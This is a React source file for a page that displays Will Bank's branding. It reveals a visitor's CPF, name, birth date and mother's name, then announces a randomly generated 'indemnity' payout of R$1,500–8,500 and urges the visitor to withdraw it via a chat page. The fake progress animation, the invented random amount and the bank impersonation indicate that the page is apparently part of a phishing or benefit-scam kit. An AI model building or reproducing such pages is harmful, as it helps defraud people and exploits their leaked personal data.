import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { CreditCard, User, Calendar, Lightbulb, Search, Volume2 } from "lucide-react";
import willbankLogo from "@/assets/willbank-logo.png";
import { CPFData } from "@/lib/cpf";

const Consulta = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [progress, setProgress] = useState(0);
  const [showData, setShowData] = useState(false);
  const [dataRevealStep, setDataRevealStep] = useState(0);
  const [isAudioPlaying, setIsAudioPlaying] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  // Gera valor aleatório entre R$ 1.500 e R$ 8.500
  const [valorBeneficio] = useState(() => {
    return Math.floor(Math.random() * (8500 - 1500 + 1) + 1500);
  });

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Progress bar animation
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return prev + 2;
      });
    }, 60);

    // Show data after progress completes
    const showDataTimer = setTimeout(() => {
      setShowData(true);
    }, 3500);

    return () => {
      clearInterval(progressInterval);
      clearTimeout(showDataTimer);
    };
  }, [cpfData, navigate]);

  // Animate data reveal step by step
  useEffect(() => {
    if (showData && dataRevealStep < 4) {
      const revealTimer = setTimeout(() => {
        setDataRevealStep((prev) => prev + 1);
      }, 800);
      return () => clearTimeout(revealTimer);
    }
  }, [showData, dataRevealStep]);

  const handlePlayAudio = () => {
    setIsAudioPlaying(true);
    // Placeholder for audio - will be replaced later
    setTimeout(() => setIsAudioPlaying(false), 3000);
  };

  const handleEfetuarSaque = () => {
    navigate("/chat", { state: { cpfData, valorBeneficio } });
  };

  if (!cpfData) return null;

  const dataFields = [
    { icon: CreditCard, label: "CPF", value: cpfData.cpf },
    { icon: User, label: "Nome", value: cpfData.nome },
    { icon: Calendar, label: "Nascimento", value: cpfData.dataNascimento },
    { icon: Lightbulb, label: "Mãe", value: cpfData.nomeMae },
  ];

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      {/* Header */}
      <header className="bg-white px-6 py-4 shadow-sm">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <img src={willbankLogo} alt="Will Bank" className="h-10 object-contain" />
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-full border border-gray-300 flex items-center justify-center">
              <span className="text-xs">👤</span>
            </div>
            <span className="text-sm font-medium text-gray-700">Usuário</span>
          </div>
        </div>
      </header>

      {/* Breadcrumb */}
      <div className="bg-white border-b px-6 py-2">
        <div className="max-w-4xl mx-auto flex items-center gap-2 text-sm text-gray-500">
          <span>☰</span>
          <span>Benefício</span>
          <span>&gt;</span>
          <span>Indenização</span>
          <span>&gt;</span>
          <span className="text-gray-900 font-medium">Análise</span>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <Card className="w-full max-w-lg shadow-xl border-0 overflow-hidden bg-white">
          {/* Progress Bar */}
          <div className="h-2 bg-gray-200">
            <div 
              className="h-full bg-[#FFE600] transition-all duration-100"
              style={{ width: `${progress}%` }}
            />
          </div>
          
          <CardContent className="p-6 sm:p-8 space-y-6">
            {/* Video Section */}
            <div className="relative aspect-video bg-gradient-to-br from-blue-900 to-blue-950 rounded-xl overflow-hidden">
              {/* Video Placeholder - will be replaced */}
              <div className="absolute inset-0 flex flex-col items-center justify-center">
                <div className="w-full h-full bg-[url('/placeholder.svg')] bg-cover bg-center opacity-50" />
                <div className="absolute inset-0 flex flex-col items-center justify-center">
                  <Button
                    onClick={handlePlayAudio}
                    className="bg-[#FFE600] hover:bg-[#FFD700] text-black font-medium px-6 py-3 rounded-full flex items-center gap-2"
                  >
                    <Volume2 className={`w-5 h-5 ${isAudioPlaying ? "animate-pulse" : ""}`} />
                    Clique para ouvir
                  </Button>
                </div>
              </div>
            </div>

            {/* Data Fields */}
            <div className="space-y-3">
              {dataFields.map((field, index) => {
                const Icon = field.icon;
                const isRevealed = dataRevealStep > index;
                
                return (
                  <div
                    key={field.label}
                    className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg border-2 border-[#FFE600]/30"
                  >
                    <div className="w-8 h-8 bg-[#FFE600] rounded-full flex items-center justify-center">
                      <Icon className="w-4 h-4 text-black" />
                    </div>
                    <div className="flex-1">
                      {isRevealed ? (
                        <span className="font-medium text-gray-900 animate-fade-in">
                          {field.value}
                        </span>
                      ) : (
                        <span className="text-gray-400">---</span>
                      )}
                    </div>
                  </div>
                );
              })}

              {/* Status Field */}
              <div className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg border-2 border-[#FFE600]/30">
                <div className="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center">
                  <Search className="w-4 h-4 text-gray-600" />
                </div>
                <div className="flex-1">
                  <span className={`text-sm ${showData && dataRevealStep >= 4 ? "text-green-600 font-medium" : "text-gray-500"}`}>
                    {showData && dataRevealStep >= 4 
                      ? "Consulta finalizada com sucesso!" 
                      : "Sua consulta está em andamento..."}
                  </span>
                </div>
              </div>
            </div>

            {/* Result Section - Shows after data reveal */}
            {showData && dataRevealStep >= 4 && (
              <div className="space-y-4 animate-fade-in">
                <div className="bg-[#FFE600]/10 rounded-xl p-4 text-center border-2 border-[#FFE600]">
                  <p className="text-sm text-gray-600 mb-2">
                    Seu saque já está disponível para resgate!
                  </p>
                  <p className="text-3xl font-bold text-gray-900">
                    R$ {valorBeneficio.toLocaleString('pt-BR')},00
                  </p>
                </div>

                <Button
                  onClick={handleEfetuarSaque}
                  className="w-full h-14 text-lg font-bold bg-[#FFE600] hover:bg-[#FFD700] text-black rounded-full"
                >
                  ✓ Efetuar Meu Saque agora!
                </Button>

                <p className="text-xs text-center text-gray-500">
                  Clique no botão acima para efetuar o saque.
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-[#FFE600] px-6 py-4">
        <div className="max-w-4xl mx-auto flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-8 object-contain" />
        </div>
      </footer>
    </div>
  );
};

export default Consulta;
